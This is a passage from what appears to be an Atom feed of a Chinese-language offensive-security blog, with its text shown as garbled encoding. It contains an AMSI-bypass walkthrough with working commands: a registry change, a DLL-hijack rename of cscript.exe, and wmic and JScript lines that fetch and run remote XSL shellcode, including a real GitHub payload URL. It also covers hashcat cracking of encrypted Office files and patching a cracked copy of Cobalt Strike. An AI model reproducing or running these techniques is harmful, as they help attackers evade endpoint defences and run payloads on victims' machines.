class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"htauri"</span>], <span class="built_in">$htadata</span>, <span class="string">"application/hta"</span>, <span class="string">"Scripted Web Delivery (mshta)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/aaaa.gif" alt="aaa"></p><p>å·²ç»ç¼–è¯‘å¥½çš„classå¯ä»¥ä»è¿™é‡Œä¸‹è½½ï¼š</p><p>GIT : <a href="https://github.com/ridter/CS_Chinese_support" target="_blank" rel="noopener">CS_Chinese_support</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-èµ·å› &quot;&gt;&lt;a href=&quot;#0x00-èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;0x00 èµ·å› &quot;&gt;&lt;/a&gt;0x00 èµ·å› &lt;/h2&gt;&lt;p&gt;åœ¨ä½¿ç”¨Cobal Strikeçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡Œé¢å·²ç»é›†æˆäº†å‡ ç§ Script Web Del
      
    
    </summary>
    
      <category term="æŠ€æœ¯åˆ†äº«" scheme="https://evi1cg.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>DotNetToJScript å¤æ´»ä¹‹è·¯</title>
    <link href="https://evi1cg.github.io/archives/AMSI_bypass.html"/>
    <id>https://evi1cg.github.io/archives/AMSI_bypass.html</id>
    <published>2018-06-26T23:20:00.000Z</published>
    <updated>2019-01-25T00:25:31.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>å»å¹´James Forshawå¼€æºäº†ä¸€ä¸ªå·¥å…·<a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">DotNetToJScript</a>ï¼Œèƒ½å¤Ÿåˆ©ç”¨JSã€Vbsç­‰è„šæœ¬åŠ è½½.Netç¨‹åºã€‚å†æ­¤å·¥å…·å‘å¸ƒä»¥åï¼Œå¾ˆå¤šå¾ˆå¤šçš„å·¥å…·ä¹Ÿåœ¨æ­¤åŸºç¡€ä¸Šäº§ç”Ÿï¼Œæ¯”å¦‚<a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">StarFighters</a>ã€<a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">CACTUSTORCH</a>ã€<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">SharpShooter</a>ç­‰ç­‰ï¼ŒåŸºäºè„šæœ¬çš„æ”»å‡»ä¹Ÿéšä¹‹è¶Šæ¥è¶Šå¤šï¼Œæ‰€ä»¥åœ¨win10ä¸­ï¼Œå¾®è½¯å¼•å…¥äº†AMSIï¼Œå¹¶å°†åŸºäºDotNetToJScriptçš„è„šæœ¬ç‰¹å¾åŠ å…¥åˆ°æ£€æµ‹ä¹‹åˆ—ã€‚å¹¶å°†æ­¤å·¥å…·æ ‡è®°ä¸ºæ¶æ„è½¯ä»¶ã€‚å¦‚æœç›´æ¥è¿è¡Œé€šè¿‡DotNetToJScriptç”Ÿæˆçš„è„šæœ¬ï¼Œä¾¿ä¼šç›´æ¥æ‹¦æˆªï¼Œå¦‚ä¸‹å›¾<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1801330724.png" alt="1530067126795.png"><br>æœ€è¿‘ï¼Œå­¦åˆ°äº†ä¸¤ç§bypassçš„æ–¹å¼ï¼Œæ‰€ä»¥è¿›è¡Œä¸€ä¸‹åˆ†äº«ã€‚</p><h2 id="0x01-ç¦ç”¨AMSI"><a href="#0x01-ç¦ç”¨AMSI" class="headerlink" title="0x01 ç¦ç”¨AMSI"></a>0x01 ç¦ç”¨AMSI</h2><p>è¿™é‡Œè®²çš„ç¦ç”¨AMSIå¹¶ä¸éœ€è¦é«˜æƒé™ï¼Œåªéœ€è¦ä¸€ä¸ªç®€å•çš„Trick,è¿™ä¸ªæ˜¯ä»<a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>å­¦æ¥çš„ï¼Œé€šè¿‡Process Monitor è¿›è¡ŒæŸ¥çœ‹ï¼Œè®¾ç½®ä»¥ä¸‹è¿‡æ»¤å™¨ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2667539399.png" alt="1530067444682.png"><br>è¿è¡Œé€šè¿‡DotNetToJScriptç”Ÿæˆçš„è„šæœ¬ï¼Œå¯ä»¥ç›‘æ§åˆ°ä»¥ä¸‹è°ƒç”¨è¿‡ç¨‹ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/870672142.png" alt="1530067501155.png"><br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨åŠ è½½AMSIä¹‹å‰ï¼ŒæŸ¥è¯¢äº†ä»¥ä¸‹æ³¨å†Œè¡¨é”®å€¼<code>HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable</code>,å°è¯•ä¿®æ”¹æ­¤é”®å€¼ä¸º0ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2027047255.png" alt="1530067589819.png"><br>å†æ¬¡è¿è¡Œè„šæœ¬ï¼Œå¯ä»¥çœ‹åˆ°shellcodeæˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/bypass.gif" alt="bypass"><br>è™½ç„¶ä¿®æ”¹æ³¨å†Œè¡¨å¯ä»¥å®ç°ç¦ç”¨AMSIï¼Œä½†æ˜¯éœ€è¦é«˜æƒé™ï¼Œé‚£æ€æ ·æ‰å¯ä»¥åœ¨æ™®é€šæƒé™ä¸‹ç¦ç”¨AMSIï¼Œå…¶å®é€šè¿‡@tiraniddoçš„æ–‡ç« æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®å¯ä»¥é€šè¿‡DLLåŠ«æŒæ¥è¿›è¡Œç»•è¿‡ã€‚é€šè¿‡Process Monitorå¯ä»¥çœ‹åˆ°æ£€æµ‹è¿‡ç¨‹ä¸­è°ƒç”¨äº†<code>C:\Windows\System32\amsi.dll</code>,å¦‚æœæˆ‘ä»¬æŠŠ<code>cscript.exe</code> é‡å‘½åæˆamsi.dllä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\cscript<span class="selector-class">.exe</span> amsi.dll</span><br><span class="line">amsi<span class="selector-class">.dll</span> evil.js</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/dllhijack.gif" alt="dllhijack"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸshellcode æˆåŠŸæ‰§è¡Œäº†ï¼Œä¿®æ”¹è¿‡æ»¤å™¨å¦‚ä¸‹ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1527631724.png" alt="1530068708904.png"><br>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è°ƒç”¨è¿‡ç¨‹<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1301244891.png" alt="1530068764803.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œç°åœ¨å·²ç»æ²¡æœ‰è°ƒç”¨<code>C:\Windows\System32\amsi.dll</code>,è¿™ä¹Ÿå°±è®©æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„shellcodeã€‚</p><h2 id="0x02-åˆ©ç”¨wmic"><a href="#0x02-åˆ©ç”¨wmic" class="headerlink" title="0x02 åˆ©ç”¨wmic"></a>0x02 åˆ©ç”¨wmic</h2><p>Casey Smith@subTeeåœ¨åšå®¢åˆ†äº«çš„ä¸€ä¸ªæŠ€å·§ï¼Œä½¿ç”¨wmicèƒ½å¤Ÿä»æœ¬åœ°æˆ–ä»URLè°ƒç”¨XSLï¼ˆå¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€ï¼‰è„šæœ¬ã€‚ç»è¿‡æµ‹è¯•ï¼Œé€šè¿‡æ­¤æ–¹å¼æ¥è°ƒç”¨DotNetToJScriptçš„è„šæœ¬ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸæ‰§è¡Œçš„ã€‚subTeeçš„æ–‡ç« <a href="https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">åœ¨è¿™</a>ã€‚åˆ©ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Local File</span></span><br><span class="line">wmic process list /FORMAT:evil.xsl</span><br><span class="line"><span class="comment">#Remote File</span></span><br><span class="line">wmic os get /FORMAT:<span class="string">"https://example.com/evil.xsl"</span></span><br></pre></td></tr></table></figure></p><p>evil.xsl<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:ms</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">"placeholder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");</span><br><span class="line">]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹å¥½çš„è„šæœ¬ï¼Œå¯ä»¥çœ‹è¿™é‡Œï¼š<a href="https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl" target="_blank" rel="noopener">æˆ³æˆ‘</a><br>ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤åˆ™å¯æ‰§è¡Œshellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:<span class="string">"https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl"</span></span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ä½¿ç”¨wmicæ‰§è¡Œçš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨powershellä¸‹æ‰§è¡Œä¼šå¤±è´¥ã€‚å¦‚ä¸‹å›¾ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2600027528.png" alt="1530081940192.png"></p><p>é‚£ä¹ˆæ€ä¹ˆè°ƒç”¨å‘¢ï¼Ÿ<br>åœ¨è¯»äº†mdsecçš„<a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ä»¥åï¼Œæˆ‘ä»¬å‘ç°ï¼Œå…¶å®æ˜¯å¯ä»¥é€šè¿‡COMæ¥è°ƒç”¨çš„ã€‚ç”¨javascriptå†™å¯ä»¥è¿™æ ·ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xml = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLDOM"</span>);</span><br><span class="line">xml.async = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> xsl = xml;</span><br><span class="line">xsl.load(<span class="string">"http://host/a.xsl"</span>);</span><br><span class="line">xml.transformNode(xsl);</span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure></p><p>GIT : <a href="https://github.com/ridter/AMSI_bypass" target="_blank" rel="noopener">AMSI_bypass</a></p><p>ä½¿ç”¨å¦‚ä¸‹å›¾ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/demo.gif" alt="demo"></p><h2 id="0x03å‚è€ƒ"><a href="#0x03å‚è€ƒ" class="headerlink" title="0x03å‚è€ƒ"></a>0x03å‚è€ƒ</h2><p><a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html</a><br><a href="https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</a><br><a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç®€ä»‹&quot;&gt;&lt;/a&gt;0x00 ç®€ä»‹&lt;/h2&gt;&lt;p&gt;å»å¹´James Forshawå¼€æºäº†ä¸€ä¸ªå·¥å…·&lt;a href=&quot;https://github.com/
      
    
    </summary>
    
      <category term="å¥‡æŠ€æ·«å·§" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨hashcatç ´è§£åŠ å¯†officeæ–‡ä»¶</title>
    <link href="https://evi1cg.github.io/archives/hashcat_crack_office.html"/>
    <id>https://evi1cg.github.io/archives/hashcat_crack_office.html</id>
    <published>2018-05-10T19:23:00.000Z</published>
    <updated>2019-01-15T05:43:36.770Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆè¦ä¸‹è½½ <a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py" target="_blank" rel="noopener">office2john.py</a>ï¼Œæ”¯æŒç ´è§£çš„åŠ å¯†ä¸ºofficeè‡ªå¸¦çš„åŠ å¯†åŠŸèƒ½ï¼Œå³ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/914483746.png" alt="83000-eyr1re7d788.png"><br>ä½¿ç”¨office2johnå°†officeè½¬æ¢ä¸ºhashï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python office2john.py 123.docx &gt; hash.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/05/577752462.png" alt="48261-cl8sxps7xum.png"><br>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆ‡å‰²ï¼Œè½¬æ¢æˆhashcatæ”¯æŒçš„å½¢å¼ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F <span class="string">":"</span> <span class="string">'&#123;print $2&#125;'</span> hash.txt &gt; hashhc.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/05/640228905.png" alt="06114-1kst5rl8a9g.png"><br>ä½¿ç”¨hashcatè¿›è¡Œç ´è§£ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 9500 hashhc.txt ~/wordlist/passwd.txt -o out.txt</span><br></pre></td></tr></table></figure></p><blockquote><p>è¿™é‡Œæˆ‘ä½¿ç”¨äº†office2010ï¼Œæ‰€ä»¥é€‰æ‹©9500ï¼Œè¦æ ¹æ®å¯¹åº”ç‰ˆæœ¬æ¥é€‰æ‹©</p></blockquote><p>é€‰æ‹©ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨ hashcat â€“help æ¥æŸ¥çœ‹<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/2444185615.png" alt="17293-xqb7bq65lso.png"><br>ç ´è§£æˆåŠŸå¦‚ä¸‹ï¼š<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/2101661963.png" alt="56296-fi7e6sribvo.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;é¦–å…ˆè¦ä¸‹è½½ &lt;a href=&quot;https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;offic
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cobalt strike3.8 ä¸­æ–‡æ”¯æŒ(Update)</title>
    <link href="https://evi1cg.github.io/archives/CS3_8_chinese_support.html"/>
    <id>https://evi1cg.github.io/archives/CS3_8_chinese_support.html</id>
    <published>2018-03-31T20:00:00.000Z</published>
    <updated>2019-01-25T00:35:01.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>cobaltstrike3.10 å·²ç»å‡ºæ¥å¾ˆä¹…äº†ï¼Œå…¶ä¸­æœ€å¸å¼•äººçš„å¯èƒ½å°±æ˜¯ä»–å·²ç»æ”¯æŒä¸­æ–‡äº†ï¼Œä½†æ˜¯è²Œä¼¼å¾ˆä¹…ä»¥æ¥éƒ½æ²¡åœ¨ç½‘ä¸Šçœ‹åˆ°3.10çš„èµ„æºï¼Œæ‰€ä»¥å°±æ²¡åŠæ³•ï¼Œæ‹¿æ‰‹ä¸Šçš„3.8 æ”¹æ”¹å°†å°±ç”¨ã€‚</p><h2 id="0x01-åç¼–è¯‘"><a href="#0x01-åç¼–è¯‘" class="headerlink" title="0x01 åç¼–è¯‘"></a>0x01 åç¼–è¯‘</h2><p>é¦–å…ˆæˆ‘ä»¬è¦å¯¹cobaltstrike3.8è¿›è¡Œåç¼–è¯‘ï¼Œè¿™é‡Œå¯ä»¥å‚ç…§ä¹‹å‰ç ´è§£çš„æ–¹æ³•ï¼Œ<a href="https://evi1cg.github.io/archives/CobaltStrike_3_8_Cracked-html.html">æˆ³æˆ‘</a>,ä½¿ç”¨<a href="https://varaneckas.com/jad/" target="_blank" rel="noopener">jad</a>è¿›è¡Œåç¼–è¯‘ã€‚</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/709982344.png" alt="1522336230599.png"></p><h2 id="0x02-ä¿®æ”¹ä»£ç "><a href="#0x02-ä¿®æ”¹ä»£ç " class="headerlink" title="0x02 ä¿®æ”¹ä»£ç "></a>0x02 ä¿®æ”¹ä»£ç </h2><p>è¦æ€ä¹ˆå®šä½åˆ°è¦æ”¹å“ªé‡Œå‘¢ï¼Ÿ<br>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹CSçš„è¾“å‡ºï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/499620101.png" alt="1522336286954.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºä¹‹å‰æœ‰<strong><code>received output</code></strong>,æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ£€ç´¢è¿™ä¸ªå…³é”®å­—ï¼Œé©¬ä¸Šå¯ä»¥å®šä½åˆ°<code>BeaconC2.class</code>æ–‡ä»¶ï¼Œæœç´¢â€œreceived outputâ€ä¸€å…±æœ‰5ä¸ªç»“æœï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/4264649045.png" alt="1522336540818.png"></p><p>æŸ¥çœ‹ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/373818852.png" alt="1522336597408.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯ç”±CommonUtilsç±»çš„bStringæ–¹æ³•è¿”å›çš„ï¼Œå®šä½åˆ°CommonUtils.classæ–‡ä»¶æŸ¥çœ‹ä»£ç ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/2911087243.png" alt="1522336678669.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼ è¿‡æ¥çš„æ•°æ®ä½¿ç”¨ ISO8859-1 è¿›è¡Œäº†ç¼–ç ã€‚ISO8859-1å±äº<code>å•å­—èŠ‚</code>ç¼–ç ï¼Œæœ€å¤šèƒ½è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´æ˜¯0-255ï¼Œåº”ç”¨äºè‹±æ–‡ç³»åˆ—ã€‚æ¯”å¦‚ï¼Œå­—æ¯açš„ç¼–ç ä¸º0x61=97ã€‚ å¾ˆæ˜æ˜¾ï¼Œ ISO8859-1 ç¼–ç è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´å¾ˆçª„ï¼Œæ— æ³•è¡¨ç¤ºä¸­æ–‡å­—ç¬¦ã€‚è¿™å°±æ˜¯CSæ— æ³•æ˜¾ç¤ºä¸­æ–‡çš„åŸå› ã€‚ç»è¿‡æµ‹è¯•ï¼Œä½¿ç”¨ ISO8859-1 è¿›è¡Œä¸­é—´ç¼–ç æ˜¯ä¸ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹ä»£ç æŠŠç¼–ç è½¬è¿‡æ¥æ¥å‘¢ï¼Ÿå½“ç„¶å¯ä»¥ ï¼</p><p>ä½†æ˜¯ç”±äºè‡ªå·±æ¯”è¾ƒèœï¼Œç›´æ¥ä¿®æ”¹CommonUtils.javaä»¥åç¼–è¯‘ä¸è¿‡å»ï¼ˆè¡¨ç¤ºå¾ˆéš¾å—ï¼Œå¦‚æœä½ ä¼šç¼–è¯‘ï¼Œè¿˜å¸Œæœ›ä¸åèµæ•™ï¼‰ã€‚æ‰€ä»¥åªèƒ½å»ä¿®æ”¹BeaconC2.javaã€‚</p><p>ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°åœ¨CSä¸Šæ‰§è¡Œå‘½ä»¤ä»¥åè¿”å›çš„ç»“æœç¼–ç ä¸ºGBKï¼Œæ‰€ä»¥è½¬ç è¿‡ç¨‹ä¸º<br>CommonUtils.javaè½¬ç ï¼š<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK -&gt; ISO8859<span class="number">-1</span></span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬è¦ä¿®æ”¹çš„BeaconC2.<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISO8859<span class="number">-1</span> -&gt; GBK -&gt; UTF<span class="number">-8</span></span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜æœ—äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¼ å…¥restä¹‹å‰æŠŠä¸­æ–‡è½¬æ¢æˆUTF-8å°±å¯ä»¥äº†ï¼Œä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/2963572890.png" alt="1522337535419.png"></p><p>æ‰€ä»¥å…³é”®ä»£ç ä¸ºï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String tmp = CommonUtils.bString(CommonUtils.readAll(in));</span><br><span class="line">String tmp1 = <span class="keyword">new</span> String(tmp.getBytes(<span class="string">"ISO8859-1"</span>),<span class="string">"gbk"</span>);</span><br><span class="line">String rest = <span class="keyword">new</span> String(tmp1.getBytes(),<span class="string">"utf-8"</span>);</span><br></pre></td></tr></table></figure></p><p>æºä»£ç æ˜¯è¿™æ ·ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/1255700732.png" alt="1522337880400.png"></p><p>ä¿®æ”¹ä»¥åæ˜¯è¿™æ ·ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/529078158.png" alt="1522337852391.png"></p><p>æ‰€ä»¥æ‰¾åˆ°æ‰€æœ‰çš„:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String rest = CommonUtils.bString(CommonUtils.readAll(in));</span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢å³å¯ã€‚</p><h2 id="0x03-ç¼–è¯‘æ›¿æ¢"><a href="#0x03-ç¼–è¯‘æ›¿æ¢" class="headerlink" title="0x03 ç¼–è¯‘æ›¿æ¢"></a>0x03 ç¼–è¯‘æ›¿æ¢</h2><p>ä¿®æ”¹ä»¥åï¼Œéœ€è¦æŠŠBeaconC2.javaç¼–è¯‘ä¹‹åæ›¿æ¢åŸæ¥çš„BeaconC2.classã€‚ç¼–è¯‘æ–¹æ³•å¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠBeaconC2.javaæ”¾åˆ°è§£å‹ä»¥åçš„CSç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -classpath . BeaconC2.java -Xlint:unchecked</span><br></pre></td></tr></table></figure></p><p>åœ¨è¿™é‡Œï¼Œå¯èƒ½ä¼šç¢°åˆ°ä»¥ä¸‹æŠ¥é”™</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/396821423.png" alt="1522338365724.png"></p><p>è¿™é‡Œå¯ä»¥æ”¹ä¸€ä¸‹ä»£ç ï¼Œå°†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> c2profile.MalleableHook.MyHook;</span><br><span class="line"><span class="keyword">import</span> dns.DNSServer.Handler;</span><br></pre></td></tr></table></figure></p><p>æ”¹ä¸ºï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> c2profile.MalleableHook;</span><br><span class="line"><span class="keyword">import</span> dns.DNSServer;</span><br></pre></td></tr></table></figure></p><p>åœ¨è¿›è¡Œç¼–è¯‘å³å¯ã€‚ä¹‹åå°†åŸæ¥çš„BeaconC2.classæ›¿æ¢ï¼Œæˆ‘ä»¬çš„CSå°±ä¿®æ”¹å®Œæˆäº†ã€‚</p><h2 id="0x04-æ•ˆæœ"><a href="#0x04-æ•ˆæœ" class="headerlink" title="0x04 æ•ˆæœ"></a>0x04 æ•ˆæœ</h2><p>è¿™é‡Œå½•äº†ä¸€ä¸ªDEMO:</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/CS.gif" alt="CS.gif"></p><h2 id="0x05-çº é”™"><a href="#0x05-çº é”™" class="headerlink" title="0x05 çº é”™"></a>0x05 çº é”™</h2><p>ç»è¿‡å°ä¼™ä¼´çš„åé¦ˆä»¥åŠæˆ‘è‡ªå·±çš„æµ‹è¯•ï¼Œå‘ç°è¿™ä¹ˆç²—æš´çš„æ”¹æ˜¯æœ‰é—®é¢˜çš„ï¼Œå¦‚æœæŠŠæ‰€æœ‰è¾“å‡ºçš„ç¼–ç éƒ½æ”¹äº†ï¼Œä¼šä½¿å¾—ç¨‹åºæµç¨‹èµ°ä¸é€šï¼Œéƒ¨åˆ†åŠŸèƒ½ä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦é’ˆå¯¹æ€§çš„ä¿®æ”¹ã€‚ä¹Ÿå°±æ˜¯åœ¨<code>BeaconC2.class</code> ä¸­ä¿®æ”¹æƒ³è¦çš„è¾“å‡ºéƒ¨åˆ†ï¼Œé¦–å…ˆï¼Œæ£€ç´¢<code>received output</code>, æŠŠå…¶å¯¹åº”çš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String rest = 